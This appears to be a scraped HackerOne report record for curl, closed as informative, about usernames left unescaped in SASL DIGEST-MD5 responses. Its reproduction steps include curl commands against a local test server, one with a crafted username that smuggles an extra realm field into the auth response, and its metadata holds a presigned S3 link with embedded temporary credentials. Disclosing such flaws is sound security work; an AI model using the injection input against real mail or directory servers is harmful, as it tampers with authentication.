@@ -1,0 +1,195 @@
+{
+  "id": 3608522,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4NTIy",
+  "url": "https://hackerone.com/reports/3608522",
+  "title": "Unescaped username in SASL DIGEST-MD5 response allows injection",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-03-16T14:54:28.967Z",
+  "submitted_at": "2026-03-16T14:54:29.430Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "am-perip",
+    "url": "/am-perip",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-03-17T14:48:47.153Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-03-17T07:40:50.045Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe username is inserted into the digest-md5 response without escaping the quotes or backslashes. The HTTP digest path on line 863 in lib/vauth/digest.c uses auth_digest_string_quoted() but the SASL does not (line 478). \n\nCommit ac419bf sorted the HTTP in 2013. It looks like the SASL was moved into the same file much later on so was potentially missed.  There is a comment that says escape the realm and nonce as necessary but it doesn't mention the user. \n\n## Affected version\n8.19.1\nTested on my mac but I expect it to work on all platforms. \n\n## Steps To Reproduce:\n\nI created a dummy server (using Claude code full disclosure) to demo.  \n\ncurl -s --max-time 2 --digest --user 'admin:pass' http://127.0.0.1:8888/\n\nProduces:\nAuthorization: Digest username=\"admin\", realm=\"test\", nonce=\"abc123\", uri=\"/\", cnonce=\"OGE4MDE5ZDQ0NGUyMWQ4NTA3Y2JjNmViMTgzZDc4NWQ=\", nc=00000001, qop=auth, response=\"741d2018ce65199de3d31d86c6b40a0e\"\n\ncurl -s --max-time 2 --digest --user 'admin\"test:pass' http://127.0.0.1:8888/\n\nProduces:\nAuthorization: Digest username=\"admin\\\"test\", realm=\"test\", nonce=\"abc123\", uri=\"/\", cnonce=\"MmMwNGRmYzdkYjMxNDI0Mjg3NjUwODU3NWRjMTk4ZWU=\", nc=00000001, qop=auth, response=\"cd9a77e93a813147fb6433d6adc94a10\"\n\ncurl -s --max-time 2 imap://127.0.0.1:1143/ --user \"admin\\\"test:pass\" --login-options \"AUTH=DIGEST-MD5\"\n\nProduces:\nusername=\"admin\"test\",realm=\"test\",nonce=\"abc123\",cnonce=\"731e487fc8b26e964f61a99afb4bc6dd\",nc=\"00000001\",digest-uri=\"imap/127.0.0.1\",response=5833517c49eae3087bb93c977f4ddbea,qop=auth\n\nAnd then using this exploit:\ncurl -s --max-time 2 imap://127.0.0.1:1143/ --user \"admin\\\",realm=\\\"evil.com:pass\" --login-options \"AUTH=DIGEST-MD5\"\n\nProduces:\nusername=\"admin\",realm=\"evil.com\",realm=\"test\",nonce=\"abc123\",cnonce=\"94bd2728bd0e169a68954fecf1778a07\",nc=\"00000001\",digest-uri=\"imap/127.0.0.1\",response=796d4900b43a41a294abe87a20a13da9,qop=auth\n\nI've added in the evil realm by injecting a field into the request. \n\nI've attached the full server script so you can see how I tested it.\n\n## Impact\n\n## Summary:\nA username containing \" or \\ produces a malformed digest-md5 response. This could potentially enable injection of data into the smtp/imap/pop3/ldap auth.",
+  "weakness": {
+    "id": 131,
+    "name": "Improper Neutralization of Escape, Meta, or Control Sequences"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5545514,
+      "file_name": "server.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8b0vbs60qiqyin1cy02bgni7lolk?response-content-disposition=attachment%3B%20filename%3D%22server.py%22%3B%20filename%2A%3DUTF-8%27%27server.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042108Z&X-Amz-Expires=1116&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d430d18b84a67d41461f5260981031e815657ea6c252288ee79e1e36b40ca39d",
+      "file_size": 2348,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 26,
+  "voters": [
+    "2026",
+    "xq_a01",
+    "bltza",
+    "shazarno1",
+    "wakony",
+    "h-u-dev",
+    "roknor",
+    "danimals553",
+    "a_segun",
+    "romanmalhotra",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3608522",
+  "votes": 26,
+  "latest_disclosable_activity_at": "2026-03-17T14:48:46.926Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:21:08.365344",
+    "source": "https://hackerone.com/reports/3608522.json",
+    "report_id": 3608522
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4NTIy",
+    "databaseId": "3608522",
+    "title": "Unescaped username in SASL DIGEST-MD5 response allows injection",
+    "url": "https://hackerone.com/reports/3608522",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2026-03-17T14:48:47.153Z",
+    "created_at": "2026-03-16T14:54:28.967Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzEzMQ==",
+      "name": "Improper Neutralization of Escape, Meta, or Control Sequences",
+      "external_id": "cwe-150"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "am-perip"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM2MDg1MjI=",
+    "_id": "3608522",
+    "disclosed": true,
+    "votes": 26,
+    "latest_disclosable_activity_at": "2026-03-17T14:48:46.926Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4NTIy",
+      "databaseId": "3608522",
+      "title": "Unescaped username in SASL DIGEST-MD5 response allows injection",
+      "url": "https://hackerone.com/reports/3608522",
+      "disclosed_at": "2026-03-17T14:48:47.153Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
